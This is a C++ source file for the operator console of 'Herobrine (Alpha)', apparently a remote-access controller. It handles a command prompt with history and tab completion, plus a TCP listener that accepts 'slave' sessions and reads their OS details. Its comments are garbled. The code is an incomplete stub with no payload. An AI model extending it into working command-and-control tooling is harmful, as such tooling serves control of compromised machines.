// Copyright 2019 SMS
// License(GPL)
// Author: ShenMian
// ����̨����

#include "cmd.h"
#include <conio.h>
#include <thread>
#include "print.h"
#include "slave.h"
#include "tcp_server.h"

namespace cmd
{
const ushort hist_size = 999 + 1;	// ������ʷ��¼����, max: 999

list<Slave>			slave;
vector<string>	arg;		// ����
deque<string>		hist;	// ��ʷ��¼

// ������
// TODO: �ú����кܴ�Ľ����ռ�
void console()
{
	short				i, j;
	const char* list[] = {
			// ����ƥ���б�
			"cls", "clear", "exit", "help", "history", "listen", "ls", "quit", "use"};
	ushort list_size = sizeof(list) / sizeof(char*);
	string cmd;	// ����

	while (true)
	{
		// ���������ʾ��
		_putch('\n');
		color::mode::underline();
		printf("him");
		color::rest();
		printf("> ");

		color::fore::white();
		color::mode::bold();

		if (hist.size() >= hist_size)	// ��ʷ��¼�����ﵽ����
			hist.pop_back();						 // ������ļ�¼����

		cmd.clear();

		short pList = -1;	// ��ǰƥ��������list[]�е��±�, û��ƥ����ʱΪ-1
		short pHist = -1;	// ��ǰѡ�е���ʷ������history�е��±�

		while (true)
		{
			// ��������
			cmd += _getch();

			if (cmd.back() == -32 || cmd.back() == 0)	// ���ܼ�
			{
				cmd.pop_back();
				short code = _getch();	// ���ܼ�ASCII����

				// ���¼� ��ʷ�����л�
				if (code == 72)	// �ϼ� ǰ����ʷ��¼ָ��
				{
					if (pHist == hist.size() - 1)	// �Ѿ�����ʷ��¼β��
						continue;
					pHist++;
				}

				if (code == 80)	// �¼� ������ʷ��¼ָ��
				{
					if (pHist == 0)	// �Ѿ�����ʷ��¼ͷ��
						continue;
					pHist--;
				}

				if (code == 72 || code == 80)	// ��ʾ��ʷ��¼
				{
					for (i = 0; i < cmd.size(); i++)	// ��������������
						printf("\b \b");
					printf("%s", hist[pHist].c_str());
					cmd = hist[pHist];
					continue;
				}

				continue;
			}

			// ���˷Ƿ��ַ�
			// TODO: ���ӿɶ���
			if ((cmd.back() < 32 && cmd.back() != '\r' && cmd.back() != '\t' &&
					 cmd.back() != '\b' && cmd.back() != 27) ||
					cmd.back() > 127)
			{
				cmd.pop_back();
				continue;
			}

			// Tab�� ��ȫ����
			if (cmd.back() == '\t')
			{
				cmd.pop_back();
				if (pList == -1)	// û��ƥ����
					continue;
				printf("%s", &list[pList][cmd.size()]);
				cmd += &list[pList][cmd.size()];
				continue;
			}

			// ESC�� ���ȫ������
			// ������������»���������Ϊ��
			if (cmd.back() == 27)
			{
				cmd.pop_back();
				for (i = 0; i < cmd.size(); i++) printf("\b \b");
				continue;
			}

			// Enter�� �����������
			if (cmd.back() == '\r')
			{
				cmd.pop_back();
				_putch('\n');
				break;
			}

			// Backspace�� �˸�
			if (cmd.back() == '\b')
			{
				cmd.pop_back();
				if (cmd.size() > 0)
				{
					printf("\b \b");
					cmd.pop_back();
				}
			}
			else
			{
				_putch(cmd.back());
			}

			// ���¿��ܵ�ƥ����, ��ʾ��ʶ
			for (i = 0; i < list_size; i++)
			{
				// �ų����̵�����
				if (strlen(list[i]) <= cmd.size() && i + 1 != list_size)
					continue;

				// ����ƥ��
				for (j = 0; j < cmd.size(); j++)
				{
					if (cmd[j] != list[i][j])
						break;
				}

				// ƥ��ɹ�
				if (j == cmd.size() && cmd.size() != 0)
				{
					pList = i;
					color::fore::gray();
					printf("%s", &list[pList][cmd.size()]);
					color::fore::white();
					color::mode::bold();
					for (j = cmd.size(); j < strlen(list[pList]); j++) _putch('\b');
					break;
				}

				// ��ƥ����
				if (i + 1 == list_size && pList != -1)
				{
					for (j = cmd.size(); j < strlen(list[pList]); j++) _putch(' ');
					for (j = cmd.size(); j < strlen(list[pList]); j++) _putch('\b');
					pList = -1;
				}
			}

			// ������
			if (cmd.size() >= cmd.max_size())
			{
				print::err("�������");
				break;
			}
		}
		color::rest();

		// �����Ϊ0
		if (cmd.size() == 0)
			continue;

		// ���浽��ʷ��¼
		// TODO: �ͷ�hist.front��ʣ��ռ�
		hist.push_front(cmd);

		// �ָ�����
		char* str = new char[cmd.size() + 1];
		strcpy(str, cmd.c_str());

		arg.clear();
		// TODO: �޷�ʶ���˫����������ո�Ĳ���
		char* pToken = strtok(str, " ");
		while (pToken != NULL)
		{
			arg.push_back(pToken);

			if (arg.size() >= arg.max_size())	// �����
				break;

			pToken = strtok(NULL, " ");
		}
		delete[] str;

		if (arg.size() >= arg.max_size())	// �����
		{
			print::err("��������");
			continue;
		}


		if (arg[0] == "exit" || arg[0] == "quit")
			exit();
		else if (arg[0] == "cls" || arg[0] == "clear")
			clear();
		else if (arg[0] == "help")
			help();
		else if (arg[0] == "listen")
			listen();
		else if (arg[0] == "history")
			history();
		else if (arg[0] == "banner")
			banner();
		else
			print::err("δ֪����: " + arg[0]);
	}
}

// ������
void banner()
{
	printf(
			"  __      __    __\n"
			" |  |    |  |  |__|   __________\n"
			" |  |____|  |   __   |  __  __  |\n"
			" |   ____   |  |  |  |  ||  ||  |\n"
			" |  |    |  |  |  |  |  ||  ||  |\n"
			" |__|    |__|  |__|  |__||__||__|\n"
			"\n"
			" [Herobrine (Alpha)             ]\n"
			" [Update Date: %-17.17s]\n"
			" [Update Time: %-17.17s]\n",
			__DATE__, __TIME__);
}

// �����Ļ
void clear()
{
	system("cls");
}

// �������ݿ�
void db()
{
	if (arg[1] == "connect")
	{
		// ���host�Ƿ�Ϸ�

		// ���port�Ƿ�Ϸ�

		// ���user�Ƿ�Ϸ�

		// ���dbname�Ƿ�Ϸ�
	}
}

// �˳�����̨
void exit()
{
	if (Slave::size())
	{
		print::warn("���лỰδ�˳�, �Ƿ�ֱ�ӹرտ���̨?[Y/n]");
		char choice = _getch();
		if (choice == 'n' || choice == 'N')
			return;
	}
	::exit(0);
}

// ����������
void help()
{
	puts(
			"  ����          ����\n"
			"  ----          ----\n"
			"  banner        ������"
			"  clear         �����Ļ\n"
			"  cls           �����Ļ\n"
			"  db            �������ݿ�\n"
			"  exit          �˳�����̨\n"
			"  help          ������������Ϣ\n"
			"  quit          �˳�����̨\n"
			"  listen        ������������\n"
			"  ls            �г��Ự\n"
			"  use           ��ָ���Ự");
}

// ���������ʷ��¼
void history()
{
	ushort i;

	puts("  ID ����");
	puts("  -- ---");
	for (i = hist.size(); i > 0; i--) printf("  %-2d %s\n", i, hist[i].c_str());
}

void thListen(TCPServer sock)
{
	Slave						slave_;
	string					buf;
	os_info_windows osInfoWindows;
	os_info_linux		osInfoLinux;

	slave_.socket(sock.accept());

	// ��ȡ����ϵͳ�ں����ƺ�ϵͳ������Ϣ
	slave_.recv(buf);
	slave_.os_info(buf);
	
}

// ����
void listen()
{
	TCPServer sock;
	thread		pthListen(thListen, sock);

	// ��
	if (!sock.bind(atoi(arg[1].c_str())))
	{
		print::err("��ʧ��");
		return;
	}

	// ����
	if (!sock.listen())
	{
		print::err("����ʧ��");
		return;
	}

	pthListen.detach();

	print::good("�ɹ�������������");
}

}	// namespace cmd
